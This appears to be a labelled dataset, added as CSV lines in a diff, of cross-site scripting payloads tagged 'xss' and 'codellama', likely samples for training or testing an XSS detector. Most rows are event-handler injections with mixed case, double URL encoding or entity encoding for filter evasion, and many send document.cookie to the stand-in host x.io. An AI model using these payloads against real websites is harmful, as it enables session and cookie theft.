+"<InPuT OnStArT=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
+%2522%253E%253Cmarquee%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
+'&gt;&lt;img onerror=location='//x.io'&gt;,1,xss,codellama
+&lt;div onclick=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
+"""><ScRiPt oNiNpUt=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
+'><AuDiO OnFoCuS=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
+%2527%253E%253Caudio%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cbody%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%253Cmarquee%2520ontoggle%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253cImG%2520OnMoUsEoVeR%253d%2522aLeRt%2528dOcUmEnT.CoOkIe%2529%2522%253E,1,xss,codellama
+"""&gt;&lt;BoDy oNfOcUs=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)&gt;",1,xss,codellama
+%2522%253E%253Cmarquee%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
+"<ScRiPt oNpOiNtErOvEr=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
+%2527%253E%253Cimg%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"<ScRiPt oNpOiNtErOvEr=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,codellama
+%253Ca%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"<IfRaMe sRc=""JaVaScRiPt:pRiNt()"">",1,xss,codellama
+'><MaRqUeE OnToGgLe=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,codellama
+%2522%253E%253Cimg%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520oninput%253Dprint%2528%2529%253E,1,xss,codellama
+"<AuDiO OnInPuT=""cOnFiRm(1)"">",1,xss,codellama
+'><A OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
+%2527%253E%253Cinput%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2527%253E%253Cvideo%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2527%253E%253Cbody%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<A OnPoInTeRoVeR=AlErT(1)>,1,xss,codellama
+%253Cdiv%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+%253Ca%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cbody%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+"<ScRiPt oNsTaRt=""LoCaTiOn='//X.Io'"">",1,xss,codellama
+"&lt;ScRiPt ontoggle=""location='//x.io'""&gt;",1,xss,codellama
+"""&gt;&lt;a oninput=alert(document.domain)&gt;",1,xss,codellama
+%2522%253E%253Cinput%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
+"&lt;object onmouseover=""location='//x.io'""&gt;",1,xss,codellama
+%2522%253E%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Caudio%2520onpointerover%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
+'><DiV OnErRoR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
+"<MaRqUeE OnAnImAtIoNsTaRt=""LoCaTiOn='//X.Io'"">",1,xss,codellama
+%253cA%2520OnClIcK%253d%2522cOnFiRm%25281%2529%2522%253E,1,xss,codellama
+"""&gt;&lt;script onclick=alert(document.cookie)&gt;",1,xss,codellama
+<ScRiPt oNeRrOr=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,codellama
+%253Cscript%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cimg%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cmarquee%2520onload%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
+'><ScRiPt oNmOuSeOvEr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+%2527%253E%253Cinput%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cimg%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cdetails%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
+<MaRqUeE OnErRoR=CoNfIrM(1)>,1,xss,codellama
+%2522%253E%253Cobject%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%253E%253CObJeCt%2520oNtOgGlE%253DFeTcH%2528%2527%252F%252Fx.iO%252F%2527%252BDoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+<DeTaIlS OnFoCuS=PrInT()>,1,xss,codellama
+%253Cdiv%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
+%253Cmarquee%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
+%2526lt%253Biframe%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%2526gt%253B,1,xss,codellama
+%253cInPuT%2520OnPoInTeRoVeR%253dAlErT%25281%2529%253E,1,xss,codellama
+<DeTaIlS OnInPuT=PrInT()>,1,xss,codellama
+%2522%253E%253Cobject%2520onmouseover%253Dprint%2528%2529%253E,1,xss,codellama
+<DeTaIlS OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
+"&lt;body onerror=""eval(atob('YWxlcnQoMSk'))""&gt;",1,xss,codellama
+%2527%253E%253Cinput%2520onpointerover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%253Caudio%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onfocus%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Cinput%2520oninput%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cimg%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%253Cinput%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Cbody%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
+"&Lt;iMg oNpOiNtErOvEr=""AlErT(DoCuMeNt.cOoKiE)""&Gt;",1,xss,codellama
+%253Cscript%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cmarquee%2520ontoggle%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2527%253E%253Ciframe%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
+<ObJeCt oNiNpUt=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+%253Cdetails%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cinput%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<InPuT OnInPuT=PrInT()>,1,xss,codellama
+"<DeTaIlS OnMoUsEoVeR=""cOnFiRm(1)"">",1,xss,codellama
+'><scr ipt ontoggle=confirm(1)>,1,xss,codellama
+<ScRiPt oNsTaRt=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
+%2522%253E%253Cimg%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"&lt;details onload=""alert(document.domain)""&gt;",1,xss,codellama
+%253Cinput%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cdetails%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Cmarquee%2520onstart%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cvideo%2520ontoggle%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+'><ViDeO OnErRoR=CoNfIrM(1)>,1,xss,codellama
+%253Cobject%2520onclick%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%253Cimg%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+"&lt;audio oninput=""print()""&gt;",1,xss,codellama
+%253CImG%2520OnToGgLe%253D%2522AlErT%25281%2529%2522%253E,1,xss,codellama
+%253Cmarquee%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Ca%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
+%253Csvg%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
+%253Cmarquee%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%253cBoDy%2520oNtOgGlE%253d%2522fEtCh%2528%2527%252F%252fX.Io%252F%2527%252BdOcUmEnT.CoOkIe%2529%2522%253E,1,xss,codellama
+"<ObJeCt oNlOaD=""aLeRt(dOcUmEnT.CoOkIe)"">",1,xss,codellama
+%2527%253E%253Cimg%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cdiv%2520oninput%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%2527%253E%253Ciframe%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+'&gt;&lt;marquee onmouseover=confirm(1)&gt;,1,xss,codellama
+%253Cscript%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2522%253E%253Cmarquee%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2522%253E%253Cmarquee%2520onclick%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<ScRiPt oNtOgGlE=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
+%2527%253E%253Csvg%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cobject%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+'&gt;&lt;iframe oninput=location='//x.io'&gt;,1,xss,codellama
+%2527%253E%253Cvideo%2520onstart%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253Caudio%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"&lt;details ontoggle=""alert(1)""&gt;",1,xss,codellama
+"<AuDiO OnStArT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+"<ScRiPt onfocus=""location='//x.io'"">",1,xss,codellama
+%253Cmarquee%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cvideo%2520ontoggle%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+"<ViDeO OnPoInTeRoVeR=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+%253Cinput%2520onclick%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onanimationstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Cimg%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cinput%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"""><MaRqUeE OnFoCuS=AlErT(DoCuMeNt.dOmAiN)>",1,xss,codellama
+<ObJeCt oNpOiNtErOvEr=lOcAtIoN='//x.iO'>,1,xss,codellama
+%2522%253E%253cAuDiO%2520OnStArT%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+%253Ciframe%2520onfocus%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520onerror%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"""><ViDeO OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
+%2522%253E%253Ciframe%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
+%253Ca%2520onerror%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+%2527%253E%253Ciframe%2520onmouseover%253Dalert%25281%2529%253E,1,xss,codellama
+<A OnClIcK=AlErT(1)>,1,xss,codellama
+%2527%253E%253Cinput%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cimg%2520onpointerover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%253Ciframe%2520src%253D%2522java%2509script%253Afetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520onmouseover%253Dprint%2528%2529%253E,1,xss,codellama
+%253Caudio%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+'><AuDiO OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
+"""><SvG OnAnImAtIoNsTaRt=cOnFiRm(1)>",1,xss,codellama
+"""&gT;&lT;ScRiPt oNmOuSeOvEr=pRiNt()&gT;",1,xss,codellama
+%2522%253E%253Cobject%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"<BoDy oNsTaRt=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,codellama
+%253Cvideo%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
+%2527%2526gt%253B%2526lt%253Bsvg%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,codellama
+"""><DiV OnMoUsEoVeR=PrInT()>",1,xss,codellama
+<ObJeCt oNiNpUt=pRiNt()>,1,xss,codellama
+"""><DiV OnToGgLe=cOnFiRm(1)>",1,xss,codellama
+%2527%253E%253Cdetails%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"""><IfRaMe oNeRrOr=pRiNt()>",1,xss,codellama
+%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
+"""><ImG OnPoInTeRoVeR=AlErT(1)>",1,xss,codellama
+%2522%253E%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Ciframe%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Cvideo%2520onmouseover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+"&lt;a onpointerover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,codellama
+%253Cdetails%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+"<iframe src=""javascr ipt:alert(document.domain)"">",1,xss,codellama
+"""><MaRqUeE OnFoCuS=EvAl(aToB('yWxLcNqOmSk'))>",1,xss,codellama
+%2522%253E%253Cimg%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Csvg%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%2527%253E%253Cobject%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"""><A OnToGgLe=lOcAtIoN='//x.iO'>",1,xss,codellama
+"<DiV OnStArT=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
+%2522%253E%253Ciframe%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
+"""><sCrIpT onmouseover=alert(1)>",1,xss,codellama
+<ScRiPt>confirm(1)</ScRiPt>,1,xss,codellama
+%253Cdetails%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+<ObJeCt oNiNpUt=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
+%2522%253E%253Cimg%2520onanimationstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
+%253cSvG%2520OnStArT%253dPrInT%2528%2529%253e,1,xss,codellama
+"""><AuDiO OnPoInTeRoVeR=CoNfIrM(1)>",1,xss,codellama
+"""&gt;&lt;video onstart=alert(document.cookie)&gt;",1,xss,codellama
+<A OnErRoR=AlErT(1)>,1,xss,codellama
+%253Ciframe%2520onfocus%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
+"<SvG OnInPuT=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
+<ImG OnLoAd=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
+<AuDiO OnMoUsEoVeR=AlErT(1)>,1,xss,codellama
+%2522%253E%253Ciframe%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<InPuT OnStArT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
+%2527%2526gt%253B%2526lt%253Ba%2520onerror%253Dalert%25281%2529%2526gt%253B,1,xss,codellama
+'><InPuT OnFoCuS=CoNfIrM(1)>,1,xss,codellama
+%2522%253E%253cInPuT%2520OnToGgLe%253DfEtCh%2528%2527%252F%252fX.Io%252F%2527%252BdOcUmEnT.CoOkIe%2529%253e,1,xss,codellama
+%253Ciframe%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cimg%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
+'&gt;&lt;input onstart=alert(1)&gt;,1,xss,codellama
+"<ViDeO OnFoCuS=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
+%253Csvg%2520ontoggle%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+%253Caudio%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
+"""><ViDeO OnPoInTeRoVeR=LoCaTiOn='//X.Io'>",1,xss,codellama
+%253Cobject%2520onclick%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+"""><MaRqUeE OnAnImAtIoNsTaRt=cOnFiRm(1)>",1,xss,codellama
+%2522%253E%253Ca%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520onerror%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"&lt;BoDy oNcLiCk=""CoNfIrM(1)""&gt;",1,xss,codellama
+%2522%253E%253cViDeO%2520OnLoAd%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,codellama
+"""&gt;&lt;input oninput=alert(document.cookie)&gt;",1,xss,codellama
+%253Cinput%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+&lt;div ontoggle=alert(document.cookie)&gt;,1,xss,codellama
+%2522%253E%253Cbody%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cimg%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+'><AuDiO OnInPuT=PrInT()>,1,xss,codellama
+%253Cobject%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"<A OnPoInTeRoVeR=""cOnFiRm(1)"">",1,xss,codellama
+%2522%253E%253CImG%2520OnLoAd%253DpRiNt%2528%2529%253E,1,xss,codellama
+'&gt;&lt;audio onanimationstart=print()&gt;,1,xss,codellama
+'&gt;&lt;a onfocus=confirm(1)&gt;,1,xss,codellama
+'><AuDiO OnLoAd=lOcAtIoN='//x.iO'>,1,xss,codellama
+<SvG OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
+%253cScRiPt%2520oNeRrOr%253D%2522EvAl%2528aToB%2528%2527yWxLcNqOmSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2522%253E%253Ca%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+"""><BoDy oNtOgGlE=LoCaTiOn='//X.Io'>",1,xss,codellama
+%253Caudio%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<MaRqUeE OnToGgLe=aLeRt(1)>,1,xss,codellama
+%253Cobject%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253Csvg%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+"""&gT;&lT;A OnFoCuS=EvAl(aToB('yWxLcNqOmSk'))&Gt;",1,xss,codellama
+<ScRiPt oNaNiMaTiOnStArT=PrInT()>,1,xss,codellama
+%2527%253E%253Cdetails%2520oninput%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cdetails%2520onfocus%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%2522%253E%253Ca%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,codellama
+'><DeTaIlS OnStArT=CoNfIrM(1)>,1,xss,codellama
+"<A OnPoInTeRoVeR=""pRiNt()"">",1,xss,codellama
+%2527%253E%253CIfRaMe%2520oNiNpUt%253DeVaL%2528AtOb%2528%2527YwXlCnQoMsK%2527%2529%2529%253E,1,xss,codellama
+"""><ObJeCt oNlOaD=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
+'><InPuT OnMoUsEoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
+%253Csvg%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
+"&lt;object onload=""confirm(1)""&gt;",1,xss,codellama
+%253Cobject%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Ca%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2522%253E%253Cinput%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cvideo%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"""><A OnFoCuS=LoCaTiOn='//X.Io'>",1,xss,codellama
+'><ScRiPt oNtOgGlE=LoCaTiOn='//X.Io'>,1,xss,codellama
+%253Cinput%2520oninput%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%2527%253E%253Cdiv%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+'><MaRqUeE OnToGgLe=cOnFiRm(1)>,1,xss,codellama
+"&lt;body onanimationstart=""print()""&gt;",1,xss,codellama
+%253Cimg%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cscr ipt%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cvideo%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2522%253E%253Cimg%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Ciframe%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2522%2526gt%253B%2526lt%253Bsvg%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2526gt%253B,1,xss,codellama
+"<DeTaIlS OnStArT=""lOcAtIoN='//x.iO'"">",1,xss,codellama
+%253Cmarquee%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"<BoDy oNaNiMaTiOnStArT=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
+%2527%253E%253Cdetails%2520onclick%253Dalert%25281%2529%253E,1,xss,codellama
+<ViDeO OnLoAd=lOcAtIoN='//x.iO'>,1,xss,codellama
+%2522%253E%253Cdetails%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2522%2526gt%253B%2526lt%253Bmarquee%2520onfocus%253Dconfirm%25281%2529%2526gt%253B,1,xss,codellama
+"<A OnToGgLe=""CoNfIrM(1)"">",1,xss,codellama
+'><BoDy oNiNpUt=aLeRt(1)>,1,xss,codellama
+%253Cmarquee%2520onload%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%253Cscript%2520onmouseover%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+%2522%253E%253Csvg%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+<A OnClIcK=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
+%2522%253E%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253cMaRqUeE%2520OnClIcK%253dEvAl%2528aToB%2528%2527yWxLcNqOmSk%2527%2529%2529%253e,1,xss,codellama
+%2527%253E%253cIfRaMe%2520oNtOgGlE%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+%2527%253E%253Cbody%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+<A OnPoInTeRoVeR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
+%253Cmarquee%2520onfocus%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%253Cinput%2520oninput%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%253Ca%2520oninput%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cimg%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253cSvG%2520OnFoCuS%253d%2522aLeRt%25281%2529%2522%253E,1,xss,codellama
+"""&gt;&lt;img oninput=alert(document.domain)&gt;",1,xss,codellama
+%253Ciframe%2520onmouseover%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cdiv%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cscript%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+"&lt;input onstart=""alert(document.cookie)""&gt;",1,xss,codellama
+%2522%253E%253Ca%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+'><DiV OnLoAd=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
+%253Cmarquee%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+<InPuT OnErRoR=AlErT(1)>,1,xss,codellama
+%253Cbody%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+'><ObJeCt oNeRrOr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+%2522%253E%253Cdiv%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"""&gt;&lt;svg onpointerover=location='//x.io'&gt;",1,xss,codellama
+%2527%253E%253Cimg%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
+%253cImG%2520OnClIcK%253dPrInT%2528%2529%253e,1,xss,codellama
+%2527%253E%253Cmarquee%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+"""><MaRqUeE OnToGgLe=aLeRt(dOcUmEnT.CoOkIe)>",1,xss,codellama
+%2522%253E%253Cvideo%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Caudio%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
+%253Caudio%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Ciframe%2520src%253D%2522JaVaScRiPt%253Aalert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%253Cdiv%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
